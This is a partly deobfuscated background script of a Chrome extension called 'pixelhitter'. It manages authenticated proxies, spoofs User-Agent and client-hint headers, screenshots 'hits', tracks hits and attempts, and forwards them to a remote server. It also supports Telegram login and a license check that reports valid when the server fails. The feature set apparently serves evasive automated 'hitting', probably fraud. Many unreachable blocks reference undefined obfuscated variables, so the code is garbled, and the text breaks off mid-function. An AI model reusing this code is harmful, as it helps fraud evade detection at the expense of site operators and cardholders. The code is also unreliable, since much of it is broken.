chrome.webRequest?.onAuthRequired?.addListener(async (x, _) => {
  const e = await chrome.storage.local.get("proxyAuth");
  if (e.proxyAuth && e.proxyAuth.username && e.proxyAuth.password) {
    {
      const x = {
        username: e.proxyAuth.username,
        password: e.proxyAuth.password
      };
      const W = {
        authCredentials: x
      };
      _(W);
    }
  } else {
    _({});
  }
}, {
  urls: ["<all_urls>"]
}, ["asyncBlocking"]);
chrome.webRequest?.onBeforeSendHeaders?.addListener(x => {
  if (proxySessionState.connected && x?.requestId && !proxyRequestUploadSeen.has(x.requestId)) {
    proxyRequestUploadSeen.add(x.requestId);
    proxySessionState.uploadBytes += estimateRequestBytes(x);
  }
}, {
  urls: ["<all_urls>"]
}, ["requestHeaders", "extraHeaders"]);
chrome.webRequest?.onHeadersReceived?.addListener(x => {
  if (proxySessionState.connected && x?.requestId && !proxyRequestDownloadSeen.has(x.requestId)) {
    proxyRequestDownloadSeen.add(x.requestId);
    proxySessionState.downloadBytes += estimateResponseBytes(x);
  }
}, {
  urls: ["<all_urls>"]
}, ["responseHeaders", "extraHeaders"]);
syncProxyPrivacyFromStorage().catch(() => {});
const VERSION_ALARM_NAME = "pixel-version-check";
function openDashboardTab() {
  const c = chrome.runtime.getURL("dashboard.html");
  const e = {
    url: c
  };
  chrome.tabs.create(e);
}
chrome.runtime.onStartup.addListener(async () => {
  await registerServiceWorker();
  await restoreUserAgentOverride().catch(() => {});
  await checkVersion().catch(() => {});
  chrome.alarms.create(VERSION_ALARM_NAME, {
    periodInMinutes: 180
  });
  await clearProxy().catch(() => {});
  try {
    const x = {
      ip: ""
    };
    x.response_time_ms = 0;
    x.country_name = "";
    x.country_code = "";
    x.ip_type = "";
    const _ = {
      pixel_proxy_enabled: false,
      pixel_proxy_string: "",
      pixel_proxy_info: x
    };
    await chrome.storage.local.set(_);
  } catch (x) {}
  setupKeepAlive();
});
chrome.runtime.onInstalled.addListener(async x => {
  await registerServiceWorker();
  await restoreUserAgentOverride().catch(() => {});
  await checkVersion().catch(() => {});
  chrome.alarms.create(VERSION_ALARM_NAME, {
    periodInMinutes: 180
  });
  await clearProxy().catch(() => {});
  try {
    const x = {
      ip: ""
    };
    x.response_time_ms = 0;
    x.country_name = "";
    x.country_code = "";
    x.ip_type = "";
    const _ = {
      pixel_proxy_enabled: false,
      pixel_proxy_string: "",
      pixel_proxy_info: x
    };
    await chrome.storage.local.set(_);
  } catch (x) {}
  setupKeepAlive();
  if (x && (x.reason === "install" || x.reason === "update")) {
    openDashboardTab();
  }
});
chrome.action.onClicked.addListener(() => {
  const x = undefined;
  openDashboardTab();
});
const ALARM_NAME = "pixel-keepalive";
function setupKeepAlive() {
  chrome.alarms.create(ALARM_NAME, {
    periodInMinutes: 0.33
  });
}
chrome.alarms.onAlarm.addListener(x => {
  if (x.name === ALARM_NAME) {
    chrome.runtime.getPlatformInfo(() => {
      chrome.runtime.lastError;
    });
  }
  if (x.name === VERSION_ALARM_NAME) {
    checkVersion().catch(() => {});
  }
});
setInterval(() => {
  chrome.runtime.getPlatformInfo(() => {
    chrome.runtime.lastError;
  });
}, 20000);
setupKeepAlive();
const ports = new Set();
chrome.runtime.onConnect.addListener(x => {
  ports.add(x);
  registerServiceWorker();
  let c = null;
  x.onDisconnect.addListener(function () {
    ports.delete(x);
    if (c) {
      clearInterval(c);
      c = null;
    }
    chrome.runtime.lastError;
  });
  c = setInterval(() => {
    try {
      {
        x.postMessage({
          type: "PING"
        });
      }
    } catch (e) {
      clearInterval(c);
      c = null;
      ports.delete(x);
    }
  }, 25000);
});
let offscreenCreated = false;
async function ensureOffscreenDocument() {
  if (offscreenCreated) {
    return true;
  }
  try {
    const c = await chrome.runtime.getContexts({
      contextTypes: ["OFFSCREEN_DOCUMENT"]
    });
    if (c.length > 0) {
      offscreenCreated = true;
      return true;
      {
        return {
          success: false,
          error: "Missing user agent value"
        };
      }
    }
    await chrome.offscreen.createDocument({
      url: "offscreen.html",
      reasons: ["AUDIO_PLAYBACK"],
      justification: "Play success sound notification"
    });
    offscreenCreated = true;
    return true;
    {
      if (_0x4474b1.name === "AbortError") {
        return {
          success: false,
          error: "Request timed out"
        };
      }
      return {
        success: false,
        error: "Connection failed"
      };
    }
  } catch (_) {
    if (_.message?.includes("already exists")) {
      offscreenCreated = true;
      return true;
      {
        let _ = _0x23e3d5 && _0x18218c.pixel_country_code ? _0x13d0e7(_0x3fcb8a.pixel_country_code).trim().toUpperCase() : "US";
        if (!/^[A-Z]{2}$/.test(_)) {
          _ = "US";
        }
        _0x1f6f37({
          countryCode: _,
          customAddressEnabled: _0x19ea9d?.pixel_custom_address_enabled === true,
          addressLine1: _0x367a2f(_0x37240c?.pixel_custom_address_line1 || "").trim(),
          city: _0x55ce10(_0x2d8b5b?.pixel_custom_address_city || "").trim(),
          state: _0x6db6c0(_0x5be6db?.pixel_custom_address_state || "").trim(),
          postcode: _0x400d43(_0x1e5f9f?.pixel_custom_address_postcode || "").trim(),
          formFillingStyle: _0x3248f1?.pixel_form_filling_style === "type" ? "type" : "direct"
        });
      }
    }
    return false;
    _0x178bda = _0x3eda40;
  }
}
const capturedHits = new Map();
async function captureScreenshot(x) {
  try {
    {
      let c = await chrome.storage.local.get(["pixel_toggle_auto_ss"]);
      if (c.pixel_toggle_auto_ss === false) {
        return null;
        _0x435245.runtime.getPlatformInfo(() => {
          _0x2f3156.runtime.lastError;
        });
      }
      let e = capturedHits.get(x);
      let W = Date.now();
      let d;
      if (e && W - e < 5000) {
        "PXNbd";
        "ccdQC";
        return null;
      }
      capturedHits.set(x, W);
      setTimeout(() => capturedHits.delete(x), 10000);
      await new Promise(x => setTimeout(x, 500));
      if (x) {
        d = await chrome.tabs.get(x);
      } else {
        {
          const [_] = await chrome.tabs.query({
            active: true,
            currentWindow: true
          });
          d = _;
        }
      }
      if (!d || !d.windowId) {
        throw new Error("Invalid tab or window");
        return _0x3b38b5;
      }
      await chrome.windows.update(d.windowId, {
        focused: true
      });
      await chrome.tabs.update(d.id, {
        active: true
      });
      await new Promise(x => setTimeout(x, 100));
      let f = await chrome.tabs.captureVisibleTab(d.windowId, {
        format: "png",
        quality: 100
      });
      if (!f) {
        return null;
      }
      await ensureOffscreenDocument();
      const r = {
        type: "COPY_TO_CLIPBOARD",
        dataUrl: f
      };
      await chrome.runtime.sendMessage(r).catch(() => {});
      let a = new Date().toISOString().replace(/[:.]/g, "-");
      await chrome.downloads.download({
        url: f,
        filename: "pixelhitter" + a + ".png",
        saveAs: false
      });
      return null;
    }
  } catch (x) {
    console.error("captureScreenshot error:", x);
    return null;
    {
      const x = new _0x34a46a(IhPLVJ.hhmHP);
      const _ = new _0x4edf10(IhPLVJ.PfxdG, "i");
      const c = IhPLVJ.CrjqR(_0x5eaaf3, IhPLVJ.goyCF);
      if (x.test(IhPLVJ.xWKil(c, IhPLVJ.Omnwh)) && _.test(IhPLVJ.wpSIH(c, IhPLVJ.ZzaPy))) {
        _0x36dbf0();
      } else {
        IhPLVJ.VuytH(c, "0");
      }
    }
  }
}
const API_URL = "https://pixelx.eu.cc/xunezgoat.php/api/verify";
const PROXY_CHECK_URL = "https://oreoxs.alwaysdata.net";
const HIT_FORWARD_URL = "https://pixelx.eu.cc/hitsender.php";
async function handleAPIRequest(x, _ = {}) {
  try {
    {
      const e = (_._method || "POST").toUpperCase();
      delete _._method;
      let W = API_URL + "?action=" + encodeURIComponent(x);
      if (e === "GET" || e === "DELETE") {
        for (const [x, e] of Object.entries(_)) {
          if (e !== null && e !== undefined) {
            W += "&" + encodeURIComponent(x) + "=" + encodeURIComponent(e);
          }
        }
      }
      const n = {
        method: e,
        headers: {
          Accept: "application/json"
        }
      };
      const t = n;
      if (e === "POST" || e === "PUT") {
        t.headers["Content-Type"] = "application/json";
        t.body = JSON.stringify(_);
      }
      const o = new AbortController();
      const f = setTimeout(() => o.abort(), 25000);
      const r = {
        ...t
      };
      r.signal = o.signal;
      const a = await fetch(W, r);
      clearTimeout(f);
      const b = await a.text();
      try {
        {
          const x = JSON.parse(b);
          if (!a.ok) {
            {
              const _ = {
                success: false,
                error: x.error || "HTTP " + a.status,
                status: a.status
              };
              return _;
            }
          }
          return x;
          {
            _0x404350({
              success: true,
              enabled: false,
              proxyString: ""
            });
          }
        }
      } catch (x) {
        return {
          success: false,
          error: "Invalid JSON response: " + b.substring(0, 200),
          raw: b
        };
      }
    }
  } catch (x) {
    if (x.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
      {
        const x = {
          username: _0x1a5aa7.proxyAuth.username,
          password: _0x5a6631.proxyAuth.password
        };
        const _ = {
          authCredentials: x
        };
        FZxBiD.WQdiA(_0x3750bb, _);
      }
    }
    const _ = {
      success: false,
      error: x.message
    };
    return _;
    _0x22b2de().then(_0x41f9cc).catch(x => _0x3ae4c5({
      success: false,
      error: x.message || "Failed to get user agent state"
    }));
    return true;
  }
}
async function checkLicenseKey(x, _) {
  try {
    {
      const e = API_URL + "?action=check-key&key=" + encodeURIComponent(x) + "&version=" + encodeURIComponent(_);
      const W = new AbortController();
      const d = setTimeout(() => W.abort(), 30000);
      const n = {
        method: "GET",
        headers: {},
        signal: W.signal
      };
      n.headers.Accept = "application/json";
      const t = await fetch(e, n);
      clearTimeout(d);
      const o = await t.text();
      if (o.trim().startsWith("<!") || o.trim().startsWith("<html")) {
        return {
          success: true,
          valid: true,
          error: "Server returned HTML",
          offline: true
        };
        return _0xbddc17.replace(/\s\d{4,6}$/, " " + _0x3fd7eb);
      }
      try {
        const x = undefined;
        return JSON.parse(o);
        _0x821500.runtime.lastError;
      } catch (x) {
        return {
          success: true,
          valid: true,
          error: "Invalid JSON response",
          offline: true
        };
        _0x15195e(_0x2f2163.token).then(_0x2f4df5).catch(x => _0x2eead4({
          success: false,
          error: x.message
        }));
        return true;
      }
    }
  } catch (x) {
    if (x.name === "AbortError") {
      {
        return {
          success: true,
          valid: true,
          error: "Request timeout",
          offline: true
        };
      }
    }
    const _ = {
      success: true,
      valid: true,
      error: x.message,
      offline: true
    };
    return _;
    {
      return {
        success: false,
        error: "Missing OTP code"
      };
    }
  }
}
async function validateToken(x) {
  try {
    const c = new AbortController();
    const e = setTimeout(() => c.abort(), 20000);
    const W = {
      token: x
    };
    const d = await fetch(VERIFY_TOKEN_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json"
      },
      body: JSON.stringify(W),
      signal: c.signal
    });
    clearTimeout(e);
    const n = await d.text();
    let t;
    try {
      t = JSON.parse(n);
    } catch (x) {
      return {
        success: false,
        error: "Invalid server response | response: " + n.substring(0, 200)
      };
      {
        const x = {
          xSlIa: "2|1|3|0|4",
          yMMLd: function (x, _) {
            return WaXFBE.GYrJq(x, _);
          },
          BvkBe: WaXFBE.GpFLB,
          QqaLl: function (x) {
            return WaXFBE.Xfsqa(x);
          },
          yartD: function (x, _) {
            return WaXFBE.ejEeu(x, _);
          }
        };
        if (!_0x491d4d.proxy || !_0x585edb.proxy.settings) {
          WaXFBE.cxPxd(_0x1f1c86, {
            success: true
          });
          return;
        }
        _0xf2b8ed.proxy.settings.clear({
          scope: "regular"
        }, () => {
          const _ = x.xSlIa.split("|");
          let c = 0;
          while (true) {
            switch (_[c++]) {
              case "0":
                x.yMMLd(_0x405e73, false);
                continue;
              case "1":
                _0x1911a2.storage.local.remove(_0x438d2d);
                continue;
              case "2":
                _0x4f80f9.storage.local.remove(x.BvkBe);
                continue;
              case "3":
                x.QqaLl(_0x1d2b98);
                continue;
              case "4":
                x.yartD(_0x5a22b9, {
                  success: true
                });
                continue;
            }
            break;
          }
        });
      }
    }
    if (d.ok && t.success === true) {
      const x = {
        success: true,
        user_id: t.user_id || "",
        username: t.username || "",
        first_name: t.first_name || "",
        pfp_url: t.pfp_url || "",
        hits: t.hits || 0,
        attempts: t.attempts || 0
      };
      return x;
      _0xb9985a = true;
      return true;
    }
    if (d.status === 401) {
      return {
        success: false,
        error: "Invalid Token"
      };
    }
    if (d.status === 403) {
      return {
        success: false,
        error: t.error || "Account suspended"
      };
    }
    const f = {
      success: false,
      error: t.error || "Bad request"
    };
    if (d.status === 400) {
      return f;
    }
    const r = {
      success: false,
      error: t.error || "Invalid token. Please regenerate your token"
    };
    return r;
    for (const [x, _] of _0x444837.entries(_0x479deb)) {
      if (WaXFBE.aJdXz(_, null) && WaXFBE.DIplr(_, _0x3374f0)) {
        _0xbfcec4 += "&" + WaXFBE.ejEeu(_0x1c9406, x) + "=" + WaXFBE.YEYqM(_0x496ff7, _);
      }
    }
  } catch (x) {
    if (x.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
    }
    return {
      success: false,
      error: "Connection failed"
    };
    {
      return {
        success: false,
        error: "Missing IP"
      };
    }
  }
}
async function verifyTempCode(x) {
  try {
    {
      const c = String(x || "").trim().toUpperCase();
      if (!c) {
        {
          return {
            success: false,
            error: "Missing OTP code"
          };
        }
      }
      const e = new AbortController();
      const W = setTimeout(() => e.abort(), 30000);
      const n = {
        method: "GET",
        headers: {
          Accept: "application/json"
        },
        signal: e.signal
      };
      const t = await fetch("https://pixelx.eu.cc/xunezgoat.php/tempcode/verify?code=" + encodeURIComponent(c), n);
      clearTimeout(W);
      const o = await t.text();
      let f = {};
      try {
        f = o ? JSON.parse(o) : {};
      } catch (x) {
        {
          return {
            success: false,
            error: "Invalid OTP response"
          };
        }
      }
      if (!t.ok) {
        const x = {
          success: false,
          error: f.error || f.message || "HTTP " + t.status
        };
        return x;
        {
          const x = {
            value: _0x152dc6.config
          };
          const _ = x;
          if (RoARpk.MQEzT(_0x41213b.scope, RoARpk.rFSVz)) {
            _.scope = RoARpk.rFSVz;
          }
          _0x34e1a5.proxy.settings.set(_, () => {
            if (_0x584d55.runtime.lastError) {
              RoARpk.hUdSZ(_0x3cabbf, {
                success: false,
                error: _0x34ecab.runtime.lastError.message || RoARpk.PTvgf
              });
              return;
            }
            const x = {
              success: false,
              error: "Proxy verification failed"
            };
            RoARpk.WMDlj(_0x4f8f0b, _0x4d7f5d, _0x2ebcef.config).then(_ => _0x294ae9(_ || x)).catch(x => _0x62462c({
              success: false,
              error: x?.message || "Proxy verification failed"
            }));
          });
        }
      }
      if (String(f.status || "").trim().toLowerCase() !== "valid" || !f.token) {
        const x = {
          success: false,
          error: f.error || f.message || "OTP is invalid or expired"
        };
        return x;
        RoARpk.FfquI(_0x58369e, 0);
      }
      return {
        success: true,
        token: String(f.token || "").trim().toUpperCase(),
        user: f.user || {}
      };
    }
  } catch (x) {
    if (x.name === "AbortError") {
      {
        return {
          success: false,
          error: "Request timed out"
        };
      }
    }
    const c = {
      success: false,
      error: x?.message || "OTP verification failed"
    };
    return c;
    {
      _0x2f4fdc.alarms.create(_0x2070da, {
        periodInMinutes: 0.33
      });
    }
  }
}
async function telegramLoginStart() {
  try {
    const _ = new AbortController();
    const c = setTimeout(() => _.abort(), 20000);
    const e = {
      method: "POST",
      headers: {},
      signal: _.signal
    };
    e.headers.Accept = "application/json";
    const W = await fetch(AUTH_BASE_URL + "/login/start", e);
    clearTimeout(c);
    const d = await W.text();
    let n;
    try {
      n = JSON.parse(d);
    } catch (_) {
      return {
        success: false,
        error: "Invalid server response"
      };
      _0x58c995 = _0x45a71e.parse(_0x3304f0);
    }
    if (!W.ok) {
      const x = {
        success: false,
        error: n.error || "HTTP " + W.status
      };
      return x;
      _0x28532c = _0x3ba6ab.pixel_user_first_name || "User";
    }
    if (!n.session_id || !n.bot_link) {
      return {
        success: false,
        error: "Missing login session data"
      };
      if (_0x45b222) {
        _0x543128.runtime.sendMessage({
          type: "STOP_CUSTOM_PREVIEW"
        }).catch(() => {});
      }
    }
    const t = {
      success: true,
      session_id: n.session_id,
      bot_link: n.bot_link
    };
    return t;
    _0x4dafd7.connected = true;
    _0x1c1eff.connectedAt = _0x5f251d || _0xffe83.now();
  } catch (_) {
    if (_.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
    }
    const c = {
      success: false,
      error: _.message || "Failed to start login"
    };
    return c;
    {
      const _ = {
        updated: true,
        outdated: false
      };
      _0x155e25().then(_ => {
        const c = _0x3ed334();
        return _0x39170e.storage.local.get([c.outdatedStorageKey]).then(x => ({
          ..._,
          outdated: x[c.outdatedStorageKey] === true
        }));
      }).then(_0x3889dd).catch(() => _0x591b05(_));
      return true;
    }
  }
}
async function telegramLoginStatus(x) {
  if (!x) {
    return {
      success: false,
      error: "Missing session_id"
    };
  }
  try {
    const c = new AbortController();
    const e = setTimeout(() => c.abort(), 20000);
    const W = AUTH_BASE_URL + "/login/status?session_id=" + encodeURIComponent(x);
    const n = await fetch(W, {
      method: "GET",
      headers: {
        Accept: "application/json"
      },
      signal: c.signal
    });
    clearTimeout(e);
    const t = await n.text();
    let o;
    try {
      o = JSON.parse(t);
    } catch (x) {
      return {
        success: false,
        error: "Invalid server response"
      };
      {
        const x = rCcxpo.klFGq(_0x23e8e6, _0x3eb25e.ip || "").trim();
        const _ = _0x345023.location && rCcxpo.DRkdx(typeof _0x46adc6.location, rCcxpo.Bskgh) ? _0x16574a.location : {};
        const c = rCcxpo.tMnnj(_0x316a13, _.country_code || _0x39b40d.countryCode || "").trim().toUpperCase();
        const e = rCcxpo.klFGq(_0x5b3867, c);
        const W = rCcxpo.UrNYt(_0x5a4585, e);
        return {
          success: !!x,
          ip: x,
          countryCode: c,
          country: rCcxpo.klFGq(_0xf133e7, _.country || _0x496afb.country || "").trim(),
          timezone: rCcxpo.uekJj(_0x1cd09e, _.timezone || "").trim(),
          locale: e,
          languages: W,
          acceptLanguage: rCcxpo.KXhzA(_0x4b9bba, e, W)
        };
      }
    }
    if (!n.ok) {
      const x = {
        success: false,
        error: o.error || "HTTP " + n.status
      };
      return x;
      {
        _0x1d035f.proxy.settings.get({
          incognito: false
        }, _0x2cdc24);
      }
    }
    const f = {
      success: true,
      status: o.status || "pending",
      user: o.user || null,
      token: o.token || ""
    };
    return f;
    rCcxpo.bNgyA(_0x45a991).catch(() => {});
  } catch (x) {
    if (x.name === "AbortError") {
      return {
        success: false,
        error: "Request timed out"
      };
    }
    const c = {
      success: false,
      error: x.message || "Failed to check login status"
    };
    return c;
    {
      rCcxpo.ushqU(_0x59b00a, "Proxy API not available while trying to apply proxy.", rCcxpo.rHsDP);
      const x = {
        success: false,
        error: rCcxpo.Sqybj
      };
      _0x1bfdf9(x);
      return;
    }
  }
}
async function pixelApiRequest({
  endpoint: x = "/",
  method: _ = "GET",
  token: c = "",
  body: e = null
}) {
  const W = {
    baseUrl: PIXEL_API_BASE,
    endpoint: x,
    method: _,
    token: c,
    body: e
  };
  return await authenticatedJsonRequest(W);
}
async function pixelMailsRequest({
  endpoint: x = "/",
  method: _ = "GET",
  token: c = "",
  body: e = null
}) {
  const d = {
    baseUrl: PIXEL_MAILS_API_BASE,
    endpoint: x,
    method: _,
    token: c,
    body: e
  };
  return await authenticatedJsonRequest(d);
}
async function pixelFeedRequest({
  endpoint: x = "/",
  method: _ = "GET",
  token: c = "",
  body: e = null
}) {
  const d = {
    baseUrl: PIXEL_FEED_BASE,
    endpoint: x,
    method: _,
    token: c,
    body: e
  };
  return await authenticatedJsonRequest(d);
}
function buildUserAgentRule(x) {
  return {
    id: USER_AGENT_RULE_ID,
    priority: 2,
    action: {
      type: "modifyHeaders",
      requestHeaders: [{
        header: "User-Agent",
        operation: "set",
        value: String(x || "")
      }]
    },
    condition: {
      urlFilter: "|http",
      resourceTypes: ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "media", "other"]
    }
  };
}
function buildFingerprintUserAgentRule(x, _ = {}) {
  const e = buildFingerprintUserAgentMetadata(x);
  const W = [{
    header: "User-Agent",
    operation: "set",
    value: String(x || "")
  }];
  if (e.secChUa) {
    {
      const x = {
        header: "sec-ch-ua",
        operation: "set",
        value: e.secChUa
      };
      W.push(x);
    }
  }
  if (e.secChUaMobile) {
    const x = {
      header: "sec-ch-ua-mobile",
      operation: "set",
      value: e.secChUaMobile
    };
    W.push(x);
  }
  if (e.secChUaPlatform) {
    {
      const x = {
        header: "sec-ch-ua-platform",
        operation: "set",
        value: e.secChUaPlatform
      };
      W.push(x);
    }
  }
  if (e.secChUaFullVersion) {
    const x = {
      header: "sec-ch-ua-full-version",
      operation: "set",
      value: e.secChUaFullVersion
    };
    W.push(x);
  }
  if (e.secChUaPlatformVersion) {
    {
      const x = {
        header: "sec-ch-ua-platform-version",
        operation: "set",
        value: e.secChUaPlatformVersion
      };
      W.push(x);
    }
  }
  if (e.secChUaArch) {
    const x = {
      header: "sec-ch-ua-arch",
      operation: "set",
      value: e.secChUaArch
    };
    W.push(x);
  }
  if (e.secChUaBitness) {
    const x = {
      header: "sec-ch-ua-bitness",
      operation: "set",
      value: e.secChUaBitness
    };
    W.push(x);
  }
  if (e.secChUaModel) {
    {
      const x = {
        header: "sec-ch-ua-model",
        operation: "set",
        value: e.secChUaModel
      };
      W.push(x);
    }
  }
  if (e.secChUaWow64) {
    const x = {
      header: "sec-ch-ua-wow64",
      operation: "set",
      value: e.secChUaWow64
    };
    W.push(x);
  }
  const d = {
    type: "modifyHeaders",
    requestHeaders: W
  };
  const t = {
    id: FINGERPRINT_USER_AGENT_RULE_ID,
    priority: 1,
    action: d,
    condition: {
      urlFilter: "|http",
      resourceTypes: ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "media", "other"]
    }
  };
  return t;
}
function buildFingerprintUserAgentMetadata(x = "") {
  const c = String(x || "");
  const e = c.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i) || c.match(/CriOS\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i);
  const W = c.match(/Edg(?:A|iOS)?\/(\d+)\.(\d+)\.(\d+)\.(\d+)/i);
  const d = c.match(/Firefox\/(\d+)\.(\d+)/i) || c.match(/FxiOS\/(\d+)\.(\d+)/i);
  const n = c.match(/Version\/(\d+)\.(\d+)/i);
  const t = String(W && W[1] || e && e[1] || d && d[1] || n && n[1] || "136");
  const o = W ? W[1] + "." + W[2] + "." + W[3] + "." + W[4] : e ? e[1] + "." + e[2] + "." + e[3] + "." + e[4] : d ? d[1] + "." + d[2] : t + ".0.0.0";
  const f = /Mobile|Android|iPhone|iPad|iPod/i.test(c) ? "?1" : "?0";
  const r = /Windows/i.test(c) ? "Windows" : /Macintosh|Mac OS X/i.test(c) ? "macOS" : /iPhone|iPad|iPod/i.test(c) ? "iOS" : /Android/i.test(c) ? "Android" : "Linux";
  const a = undefined;
  return {
    secChUa: W ? "\"Chromium\";v=\"" + t + "\", \"Microsoft Edge\";v=\"" + t + "\", \"Not.A/Brand\";v=\"24\"" : d ? "\"Firefox\";v=\"" + t + "\"" : n && !e ? "\"Safari\";v=\"" + t + "\"" : "\"Chromium\";v=\"" + t + "\", \"Google Chrome\";v=\"" + t + "\", \"Not.A/Brand\";v=\"24\"",
    secChUaMobile: f,
    secChUaPlatform: "\"" + r + "\"",
    secChUaFullVersion: "\"" + o + "\"",
    secChUaPlatformVersion: "\"" + (/Windows/i.test(r) ? "15.0.0" : /macOS/i.test(r) ? "14.0.0" : "13.0.0") + "\"",
    secChUaArch: "\"" + (/64|x64|Win64/i.test(c) ? "x86" : "arm") + "\"",
    secChUaBitness: "\"" + (/64|x64|Win64/i.test(c) ? "64" : "32") + "\"",
    secChUaModel: "\"" + (/Mobile|Android|iPhone|iPad|iPod/i.test(c) ? "mobile" : "") + "\"",
    secChUaWow64: "?0"
  };
}
function normalizeFingerprintSettings(x) {
  const e = x && typeof x === "object" ? x : {};
  return {
    userAgent: e.userAgent !== false
  };
}
function normalizeFingerprintProfileMode(x) {
  if (String(x || "").trim().toLowerCase() === "static") {
    return "static";
  } else {
    return "rotating";
  }
}
function deriveAppVersionFromUserAgent(x = "") {
  const _ = undefined;
  const c = String(x || "").trim();
  if (!c) {
    return "";
  }
  return c.replace(/^Mozilla\//i, "");
}
async function generateFingerprintUserAgent(x = "") {
  const c = String(x || navigator.userAgent || "").trim();
  if (!c) {
    return "";
  }
  const e = await loadFingerprintReferenceDevices();
  const W = e?.mobile?.android || [];
  const d = String(Math.floor(Math.random() * 90000) + 10000);
  if (/android/i.test(c) && W.length) {
    const x = W[Math.floor(Math.random() * W.length)];
    const e = c.replace(/(Android [^;]+;\s*)([^)]+)(\))/i, "$1" + x + "$3");
    if (/\s\d{4,6}$/.test(e)) {
      return e.replace(/\s\d{4,6}$/, " " + d);
      for (const x of _0x45090c) {
        _0x345267.push({
          label: "fixed:" + _0x94ff61 + ":" + x,
          config: pLyrxI.eybwR(_0x5ddac9, _0xb270a5, _0x15f4fb),
          scope: x
        });
      }
    }
    return e + " " + d;
    _0x3d2452(_0x11ec33.proxy, _0x37cb56.proxyType).then(_0xe46c92).catch(x => _0x327f71({
      success: false,
      error: x.message
    }));
    return true;
  }
  if (/\s\d{4,6}$/.test(c)) {
    return c.replace(/\s\d{4,6}$/, " " + d);
    pLyrxI.yVtLM(_0x407e74);
  }
  return c + " " + d;
}
async function clearFingerprintUserAgentRule({
  clearStorage: x = false
} = {}) {
  const e = {
    removeRuleIds: [FINGERPRINT_USER_AGENT_RULE_ID]
  };
  await chrome.declarativeNetRequest.updateDynamicRules(e);
  if (x) {
    const x = {
      [FINGERPRINT_ACTIVE_USER_AGENT_KEY]: ""
    };
    await chrome.storage.local.set(x);
  }
}
async function applyFingerprintUserAgentRule(x, _ = {}) {
  const e = String(x || "").trim();
  if (!e) {
    await clearFingerprintUserAgentRule({
      clearStorage: true
    });
    return {
      success: false,
      error: "Missing fingerprint user agent value"
    };
    {
      const x = {
        dataUrl: _0x40500a
      };
      _0x561d04(x);
    }
  }
  const W = normalizeFingerprintHeaderContext(_);
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [FINGERPRINT_USER_AGENT_RULE_ID],
    addRules: [buildFingerprintUserAgentRule(e, W)]
  });
  const d = {
    [FINGERPRINT_ACTIVE_USER_AGENT_KEY]: e
  };
  await chrome.storage.local.set(d);
  const n = {
    success: true,
    value: e
  };
  return n;
}
async function reconcileFingerprintUserAgentRule({
  rotate: x = false
} = {}) {
  await clearFingerprintUserAgentRule({
    clearStorage: true
  });
}
async function getOrCreateFingerprintUserAgent() {
  await clearFingerprintUserAgentRule({
    clearStorage: true
  });
  return {
    success: false,
    error: "Fingerprint spoofer removed"
  };
}
async function setFingerprintUserAgent(x, _ = {}) {
  await clearFingerprintUserAgentRule({
    clearStorage: true
  });
  return {
    success: false,
    error: "Fingerprint spoofer removed"
  };
}
async function applyUserAgentOverride(x, _ = {}) {
  const e = String(x || "").trim();
  if (!e) {
    return {
      success: false,
      error: "Missing user agent value"
    };
    throw new _0x40586("Select a normal website tab first.");
  }
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [USER_AGENT_RULE_ID],
    addRules: [buildUserAgentRule(e)]
  });
  await chrome.storage.local.set({
    [USER_AGENT_ENABLED_KEY]: true,
    [USER_AGENT_STORAGE_KEY]: e,
    [USER_AGENT_BROWSER_KEY]: String(_.browser || "").trim(),
    [USER_AGENT_DEVICE_KEY]: String(_.device || "").trim()
  });
  return {
    success: true,
    enabled: true,
    value: e,
    browser: String(_.browser || "").trim(),
    device: String(_.device || "").trim()
  };
}
async function clearUserAgentOverride() {
  const x = {
    removeRuleIds: [USER_AGENT_RULE_ID]
  };
  await chrome.declarativeNetRequest.updateDynamicRules(x);
  const _ = {
    [USER_AGENT_ENABLED_KEY]: false,
    [USER_AGENT_STORAGE_KEY]: "",
    [USER_AGENT_BROWSER_KEY]: "",
    [USER_AGENT_DEVICE_KEY]: ""
  };
  await chrome.storage.local.set(_);
  return {
    success: true,
    enabled: false,
    value: "",
    browser: "",
    device: ""
  };
}
async function getUserAgentState() {
  const _ = await chrome.storage.local.get([USER_AGENT_ENABLED_KEY, USER_AGENT_STORAGE_KEY, USER_AGENT_BROWSER_KEY, USER_AGENT_DEVICE_KEY]);
  return {
    success: true,
    enabled: _[USER_AGENT_ENABLED_KEY] === true,
    value: String(_[USER_AGENT_STORAGE_KEY] || "").trim(),
    browser: String(_[USER_AGENT_BROWSER_KEY] || "").trim(),
    device: String(_[USER_AGENT_DEVICE_KEY] || "").trim()
  };
}
async function restoreUserAgentOverride() {
  const _ = await getUserAgentState();
  if (!_.enabled || !_.value) {
    const x = {
      removeRuleIds: [USER_AGENT_RULE_ID]
    };
    await chrome.declarativeNetRequest.updateDynamicRules(x);
    return {
      success: true,
      restored: false
    };
    {
      const x = _0x5c0127.lastIndexOf("@");
      const _ = _0x2dfda5.substring(0, x);
      const c = _0x3eb8fd.substring(neqnSN.zQpRw(x, 1));
      const e = _.indexOf(":");
      if (neqnSN.uIqdG(e, 0)) {
        _0x3a1162 = _.substring(0, e);
        _0x56bb8a = _.substring(neqnSN.zQpRw(e, 1));
      }
      const W = c.lastIndexOf(":");
      if (neqnSN.tlfdN(W, 0)) {
        _0x5a66de = c.substring(0, W);
        _0x3a0e95 = neqnSN.rfDNF(_0x494b70, c.substring(neqnSN.zQpRw(W, 1))) || 8080;
      }
    }
  }
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [USER_AGENT_RULE_ID],
    addRules: [buildUserAgentRule(_.value)]
  });
  return {
    success: true,
    restored: true
  };
}
async function pixelIpLookupRequest({
  ip: x = "",
  token: _ = ""
}) {
  try {
    const e = String(x || "").trim();
    if (!_ || !String(_).trim()) {
      return {
        success: false,
        error: "Missing auth token"
      };
      _0x22139e.scope = EzymEs.NYzzN;
    }
    if (!e) {
      {
        return {
          success: false,
          error: "Missing IP"
        };
      }
    }
    const W = new AbortController();
    const d = setTimeout(() => W.abort(), 25000);
